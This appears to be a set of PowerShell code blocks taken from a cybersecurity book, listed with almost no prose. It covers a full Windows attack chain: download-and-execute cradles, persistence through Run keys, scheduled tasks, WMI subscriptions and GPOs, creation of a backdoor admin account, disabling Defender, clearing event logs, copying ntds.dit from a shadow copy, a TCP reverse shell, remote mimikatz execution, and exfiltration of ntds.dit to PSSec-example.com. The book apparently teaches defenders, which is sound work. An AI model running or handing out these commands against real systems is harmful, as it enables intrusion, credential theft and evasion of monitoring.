["```\nGet-Command -Module PowerSploit\n```", "```\n> $AadInfo = Invoke-WebRequest \"https://login.microsoftonline.com/getuserrealm.srf?login=PSSec-User@PSSec-Demo.onmicrosoft.com&xml=1\"\n> ([xml]$ AadInfo.Content).RealmInfo\n```", "```\n> Set-ExecutionPolicy Unrestricted\n```", "```\n> powershell.exe -ExecutionPolicy Bypass -File script.ps1\n> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser\n```", "```\n> echo <command> | PowerShell.exe -noprofile –\n> Get-Content ./script.ps1 | PowerShell.exe -noprofile –\n> powershell.exe -command <command>\n> Invoke-Command -scriptblock {<command>}\n> Invoke-Expression -Command <command>\n```", "```\n> powershell.exe -c <command>\n> powershell.exe -Command <command>\n```", "```\n> powershell.exe -nop -c <command>\n> powershell.exe -NoProfile -c <command>\n```", "```\nInvoke-WebRequest -Uri <source> -OutFile <destination>\n```", "```\n> Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1' -OutFile 'C:\\Users\\Administrator\\Downloads\\HelloWorld.ps1'\n```", "```\n> iwr -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1' -OutFile 'C:\\Users\\Administrator\\Downloads\\HelloWorld.ps1'\n```", "```\niex (Invoke-RestMethod '<url>' )\n```", "```\n> Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1'\n```", "```\nStart-BitsTransfer -Source <source> -Destination <destination>\n```", "```\n> Start-BitsTransfer -Source 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1' -Destination 'C:\\Users\\Administrator\\Downloads\\HelloWorld.ps1'\n```", "```\n> Invoke-Expression (Invoke-WebRequest -Uri '<url to script>')\n> iex(Invoke-WebRequest -Uri '<url to script>')\n> iex(Invoke-WebRequest -Uri '<url to script>'); <command from script>}\n```", "```\n> iex(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1')\n```", "```\n> iex(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-NetDomain\n```", "```\n$Url = \"https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1\"\n$HttpRequest = New-Object -ComObject Microsoft.XMLHTTP\n$HttpRequest.open('GET', $Url, $false)\n$HttpRequest.send()\niex $HttpRequest.responseText\n```", "```\n$HttpRequest.SetRequestHeader(\"User-Agent\", \"1337\")\n```", "```\n(New-Object System.Net.WebClient).DownloadFile(<source>, <destination>)\n```", "```\n> $Url = \"https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1\"\n> $OutputFile = \"C:\\Users\\Administrator\\Downloads\\HelloWorld.ps1\"\n> (New-Object System.Net.WebClient).DownloadFile($Url, $OutputFile)\n```", "```\n> iex((New-Object System.NET.WebClient).DownloadString(<source>))\n```", "```\n> $Url = \"https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1\"\n> iex((New-Object System.NET.WebClient).DownloadString($Url))\n```", "```\n$Url = \"https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1\"\n$WebClient = New-Object System.NET.WebClient\n$WebClient.Headers.Add(\"user-agent\", \"1337\")\niex(($WebClient).DownloadString($Url))\n```", "```\n> $Url = \"https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter08/XmlDocument-Demo.xml\"\n> $Xml = New-Object System.Xml.XmlDocument\n> $Xml.Load($Url)\n```", "```\n> $Xml.xml.node1.HelloWorld | iex\n> $Xml.xml.othernode | iex\n```", "```\n> $Url = \"https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1\"\n> $WebRequest = [System.NET.WebRequest]::Create($Url)\n> $Response = $WebRequest.GetResponse()\n> iex ([System.IO.StreamReader]($Response.GetResponseStream())).ReadToEnd()\n```", "```\n> $Url = \"https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1\"\n> $webRequest = [System.NET.WebRequest]::Create($Url)\n> $webRequest.UserAgent = \"1337\"\n> $Response = $WebRequest.GetResponse()\n> iex ([System.IO.StreamReader]($Response.GetResponseStream())).ReadToEnd()\n```", "```\n$source = @\"\nusing System;\npublic class SayHello\n{\n    public static void Main()\n    {\n        Console.WriteLine(\"Hello World!\");\n    }\n}\n\"@\nAdd-Type -TypeDefinition $source -Language CSharp\n[SayHello]::Main()\n```", "```\n> New-ItemProperty -Path \"<registry path>\" -Name \"<name>\" -PropertyType String -Value \"<powershell command>\"\n```", "```\n> New-ItemProperty -Path \"REGISTRY::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"NotSuspiciousAtAll\" -PropertyType String -Value \"powershell.exe -NonInteractive -WindowStyle Hidden -Execution-Policy ByPass -File 'C:\\windows\\system32\\HelloWorld.ps1'\"\n```", "```\n$path = \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nif( -Not (Test-Path -Path $path )) {\n        New-Item -ItemType directory -Path $path\n}\niwr -Uri \"https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1\" -OutFile \"$path\\HelloWorld.ps1\"\n```", "```\n$path = \"$env:PROGRAMDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HelloWorld.ps1\"\nNew-Item -Path $path -ItemType File\nAdd-Content -Path $path -Value \"Write-Host 'Hello World!'\"\n```", "```\n> schtasks /create /tn \"NotSuspiciousAtAll\" /tr \"powershell.exe -ExecutionPolicy Bypass -File C:\\windows\\system32\\HelloWorld.ps1\" /sc onstart\n```", "```\n    Add-Content -Path $Profile -Value \"C:\\path\\to\\script.ps1\"\n    ```", "```\n    Add-Content -Path $Profile -Value \"Invoke-Command ...\"\n    ```", "```\n$profiles = Get-ChildItem -Path \"C:\\Users\" -Filter \"Profile.ps1\" -Recurse\nforeach ($profile in $profiles) {\n    Add-Content -Path $profile.FullName -Value \"C:\\windows\\system32\\HelloWorld.ps1\"\n}\n```", "```\n> Add-Content -Path \"$PSHOME\\Profile.ps1\" -Value \"C:\\path\\to\\script.ps1\"\n```", "```\n$filter = Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='WMIPersistenceFilter';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 07 AND TargetInstance.Minute = 00 GROUP WITHIN 60\"};\n```", "```\n$consumer = Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='WMIPersistenceConsumer';CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File C:\\windows\\system32\\HelloWorld.ps1\";RunInteractively='false'};\n```", "```\nSet-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}\n```", "```\n$gpo = New-GPO -Name \"PersistentScript\"\nSet-GPRegistryValue -Name \"PersistentScript\" -Key \"HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Run\" -ValueName \"PersistentScript\" -Type String -Value \"powershell.exe -ExecutionPolicy Bypass -File \\\\Dc01\\sysvol\\PSSec.local\\scripts\\HelloWorld.ps1\"\n```", "```\n> New-GPLink -Name \"PersistentScript\" -Target \"DC=domain,DC=local\"\n```", "```\n$gpo = Get-GPO -Name \"PersistentScript\"\nSet-GPRegistryValue -Name \"PersistentScript\" -Key \"HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion\\Run\" -ValueName \"PersistentScript\" -Type String -Value \"powershell.exe -ExecutionPolicy Bypass -File \\\\Dc01\\sysvol\\PSSec.local\\scripts\\HelloWorld-Modified.ps1\"\n```", "```\n> $pass = ConvertTo-SecureString \"Hacked!123\" -AsPlainText -Force\n> New-LocalUser -Name hacker -Password $pass\n> Add-LocalGroupMember -Group Administrators -Member hacker\n```", "```\n> net user hacker Hacked!123 /add /Y\n> net localgroup administrators hacker /add\n```", "```\n> powershell.exe -w hidden -c <command>\n> powershell.exe -WindowStyle hidden -c <command>\n```", "```\n> powershell.exe -e \"<Base64 string>\"\n```", "```\n> powershell.exe -e \"VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBvAHIAbABkACEAJwA=\"\n```", "```\n> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"<text>\"))\n```", "```\n> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"Write-Host 'Hello World!'\"))\n```", "```\n> [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(\"Write-Host 'Hello World!'\"))\n```", "```\n> [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"<Base64 string>\"))\n```", "```\n> [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBv AHIAbABkACEAJwA=\"))\n```", "```\n> [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\"V3JpdGUtSG9zdCAnSGVsbG8gV29ybGQhJw==\"))\n```", "```\n> powershell.exe -version 2 –command <command>\n```", "```\n> powershell.exe -version 2\nVersion v2.0.50727 of the .NET Framework is not installed and it is required to run version 2 of Windows PowerShell.\n```", "```\n> Get-WindowsOptionalFeature -Online | Where-Object {$_.FeatureName -match \"PowerShellv2\"}\nFeatureName : MicrosoftWindowsPowerShellV2Root\nState       : Enabled\nFeatureName : MicrosoftWindowsPowerShellV2\nState       : Enabled\n```", "```\n> Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableNetworkProtection AuditMode -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -EnableControlledFolderAccess Disabled -Force\n```", "```\nGet-WinEvent -ListLog * | foreach {\n    try {       [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }\n    catch {}\n}\n```", "```\n$ShadowCopy = Invoke-CimMethod -ClassName \"Win32_ShadowCopy\" -Namespace \"root\\cimv2\" -MethodName \"Create\" -Arguments @{Volume=\"C:\\\"}\n$ShadowCopyPath = (Get-CimInstance -ClassName Win32_ShadowCopy | Where-Object { $_.ID -eq $ShadowCopy.ShadowID }).DeviceObject + \"\\\\\"\ncmd /c mklink /d C:\\shadowcopy \"$ShadowCopyPath\"\n```", "```\n> Copy-Item \"C:\\shadowcopy\\Windows\\NTDS\\ntds.dit\" -Destination \"C:\\tmp\"\n```", "```\n> (Get-Item C:\\shadowcopy).Delete()\n```", "```\n> whoami\n```", "```\n> Get-CimInstance -ClassName Win32_UserAccount\n```", "```\n> Get-LocalUser\n> net users\n```", "```\n> Get-ADUser\n```", "```\n$domain = Get-WmiObject -Namespace root\\cimv2 -Class Win32_ComputerSystem | Select-Object -ExpandProperty Domain\n$filter = \"(sAMAccountType=805306368)\"\n$searcher = [adsisearcher]\"(&(objectCategory=User)$filter)\"\n$searcher.SearchRoot = \"LDAP://$domain\"\n$searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}\n```", "```\n> net user /domain\n```", "```\n> Get-CimInstance -ClassName Win32_Group\n```", "```\n> Get-LocalGroup\n> net localgroups\n```", "```\n> Get-ADGroup\n```", "```\n> net group /domain\n```", "```\n$domain = Get-WmiObject -Namespace root\\cimv2 -Class Win32_ComputerSystem | Select-Object -ExpandProperty Domain\n$searcher = [adsisearcher]\"(&(objectCategory=group))\"\n$searcher.SearchRoot = \"LDAP://$domain\"\n$searcher.FindAll() | ForEach-Object {$_.GetDirectoryEntry().Name}\n```", "```\n> hostname\n```", "```\n> systeminfo\n```", "```\n> ipconfig /all\n```", "```\n> Get-NetAdapter | fl\n```", "```\n> route print\n```", "```\n> arp -A\n```", "```\n> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n```", "```\n> ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n```", "```\n> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()\n```", "```\n> ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()\n```", "```\n> nltest /dclist:PSSEC.local\n```", "```\n> net group \"domain controllers\" /domain\n```", "```\n> nltest /dsgetdc:PSSEC.local\n```", "```\n> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct\n```", "```\n> Invoke-Command <ip address or hostname> {<scriptblock/binary>}\n```", "```\n> Invoke-Command PSSec-PC01 {Get-Process}\n> Invoke-Command PSSec-PC01 {C:\\tmp\\mimikatz.exe}\n```", "```\nEnter-PSSession <ip address or hostname>\n```", "```\n> Enter-PSSession PSSec-PC01\n```", "```\n$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, 4444)\n$listener.Start()\n$client = $listener.AcceptTcpClient()\n```", "```\n$client = New-Object System.Net.Sockets.TcpClient\n$client.Connect(\"172.29.0.20\", 4444)\n$stream = $client.GetStream()\n$writer = New-Object System.IO.StreamWriter($stream)\n$reader = New-Object System.IO.StreamReader($stream)\nwhile($true) {\n    $data = \"\"\n    while($stream.DataAvailable) {\n        $bytes = New-Object Byte[] 1024\n        $count = $stream.Read($bytes, 0, 1024)\n        $data += [System.Text.Encoding]::ASCII.GetString($bytes, 0, $count)\n    }\n    if ($data) {\n        Invoke-Expression $data\n        $data = \"\"\n    }\n}\n$writer.Close()\n$reader.Close()\n$client.Close()\n```", "```\n$stream = $client.GetStream()\n$bytes = [System.Text.Encoding]::ASCII.GetBytes(\"Write-Host 'Hello world!'\")\n$stream.Write($bytes, 0, $bytes.Length)\n$stream.Flush()\n```", "```\n$client.Close()\n```", "```\n> $FileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"C:\\shadowcopy\\Windows\\NTDS\\ntds.dit\"))\n> Invoke-WebRequest -uri http://PSSec-example.com/upload -Method POST -Body $FileContent\n```", "```\n> $FileToUpload = \"C:\\shadowcopy\\Windows\\NTDS\\ntds.dit\"\n> (New-Object System.NET.WebClient).UploadFile(\"ftp://PSSec-example.com/ntds.dit, $FileToUpload)\n```", "```\n> Stop-Service -Name Spooler -Force\n```", "```\n> Stop-Computer -ComputerName localhost\n```", "```\n> shutdown /s /t 0\n```"]